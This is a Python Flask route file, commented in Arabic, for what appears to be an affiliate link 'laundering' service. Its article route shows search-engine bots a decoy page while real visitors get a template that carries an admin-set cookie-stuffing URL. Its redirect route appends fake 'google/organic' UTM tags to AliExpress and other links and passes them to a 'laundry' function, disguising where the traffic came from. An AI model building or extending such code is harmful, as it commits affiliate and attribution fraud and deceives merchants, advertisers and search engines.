import os
from flask import Blueprint, render_template, request, redirect
from pymongo import MongoClient
from app.utils.helpers import is_bot, get_laundry_html
from datetime import datetime

public_bp = Blueprint('public', __name__)

# --- إعداد اتصال قاعدة البيانات (مباشر لضمان العمل) ---
# نكرر الاتصال هنا لتفادي مشاكل الاستيراد المعقدة
mongo_uri = os.environ.get('MONGO_URI')
try:
    client = MongoClient(mongo_uri)
    db = client['elite_saas_v1']
except:
    db = None

# 1. الصفحة الرئيسية (الشركة)
@public_bp.route('/')
def home():
    return render_template('home_corporate.html')

# 2. صفحة عرض المقال (المجلة)
# الرابط: domain.com/CATEGORY/slug-code
@public_bp.route('/<category>/<slug>')
def article_view(category, slug):
    if not db: return "Database Error", 500

    # أ. البحث عن الرابط في قاعدة البيانات
    link = db.links.find_one({"slug": slug})
    
    # ب. إذا الرابط غير موجود
    if not link:
        return "404 - Link Not Found", 404

    # ج. كشف البوتات (Cloaking)
    user_agent = request.headers.get('User-Agent', '')
    if is_bot(user_agent):
        return f"<h1>News: {link['title']}</h1><p>Loading...</p>"

    # د. جلب إعدادات الكوكيز (الخاصة بالأدمن)
    # لاحقاً سنضيف منطق المستخدمين البرو هنا
    settings = db.settings.find_one({"type": "global"})
    cookie_url = settings.get('stuffing_url', '') if settings else ''

    # هـ. عرض المجلة
    return render_template(
        'article_magazine.html',
        title=link['title'],       # العنوان من الداتابيز
        category=category.upper(),
        date=datetime.utcnow().strftime('%B %d, %Y'),
        target_url=link['target_url'], # الرابط الهدف من الداتابيز
        cookie_url=cookie_url
    )

# 3. الغسالة (نقطة التحويل النهائية)
@public_bp.route('/redirect')
def redirect_engine():
    url = request.args.get('url')
    traffic_type = request.args.get('type')
    
    if not url: return redirect('/')
    
    # حقن UTM لتوثيق الزيارة كـ Google Organic
    if "aliexpress.com" in url or traffic_type == "organic":
        if "utm_source" not in url:
            sep = "&" if "?" in url else "?"
            url += f"{sep}utm_source=google&utm_medium=organic&utm_campaign=secure_v9"
    
    # استدعاء المحرك
    return get_laundry_html(url)
